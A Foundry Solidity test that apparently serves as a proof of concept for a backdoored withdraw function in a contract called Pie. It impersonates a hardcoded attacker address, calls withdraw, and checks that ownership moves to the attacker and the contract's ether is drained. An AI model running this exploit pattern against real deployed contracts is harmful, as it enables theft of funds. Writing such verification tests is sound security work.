// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd2018bfaa266a9ec0a1a84b061640faa009def76.sol";

contract PieTest is Test {
    Pie public pie;
    // Attacker address hardcoded in the vulnerable withdraw function
    address constant ATTACKER = 0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
    
    function setUp() public {
        pie = new Pie();
        // Fund Pie contract with 1 ETH
        deal(address(pie), 1 ether);
    }

    function testAttackerCanTakeOwnershipAndDrainFunds() public {
        console.log("--- BEFORE-Trigger ---");
        // Capture pre-attack state
        address ownerBefore = pie.Owner();
        uint256 contractBalanceBefore = address(pie).balance;
        uint256 totalWithdrawalsBefore = pie.totalWithdrawals();
        
        console.log("Owner address before:", ownerBefore);
        console.log("Contract ETH balance before:", contractBalanceBefore);
        console.log("Total withdrawals amount before:", totalWithdrawalsBefore);

        console.log("--- Trigger: Attacker calls withdraw ---");
        uint256 attackerBalanceBefore = ATTACKER.balance;
        // Simulate attacker calling the vulnerable function
        vm.prank(ATTACKER);
        pie.withdraw();

        console.log("--- AFTER-Trigger ---");
        // Capture post-attack state
        address ownerAfter = pie.Owner();
        uint256 contractBalanceAfter = address(pie).balance;
        uint256 totalWithdrawalsAfter = pie.totalWithdrawals();
        uint256 attackerBalanceAfter = ATTACKER.balance;
        
        console.log("Owner address after:", ownerAfter);
        console.log("Contract ETH balance after:", contractBalanceAfter);
        console.log("Total withdrawals amount after:", totalWithdrawalsAfter);
        console.log("Attacker balance change:", attackerBalanceAfter - attackerBalanceBefore);

        // Vulnerability verification conditions
        bool ownerChanged = (ownerAfter != ownerBefore);
        bool ownershipTaken = (ownerAfter == ATTACKER);
        bool balanceDrained = (contractBalanceAfter == 0);
        bool withdrawalsIncreased = (totalWithdrawalsAfter == totalWithdrawalsBefore + contractBalanceBefore);

        if (ownerChanged && ownershipTaken && balanceDrained && withdrawalsIncreased) {
            console.log("Vulnerability Exists: Attacker successfully took contract ownership and drained funds");
        } else {
            console.log("Vulnerability not Exist: Attack failed to alter all required states");
        }
    }
}